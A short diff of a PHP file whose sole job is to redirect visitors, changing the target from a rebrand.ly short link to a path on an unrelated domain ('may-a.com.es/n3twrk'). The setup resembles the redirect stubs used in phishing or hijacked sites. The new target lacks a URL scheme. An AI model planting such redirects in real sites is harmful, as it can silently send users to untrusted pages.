@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://rebrand.ly/15807e7/");
+header("Location: may-a.com.es/n3twrk/index.html");
 exit();
 ?>
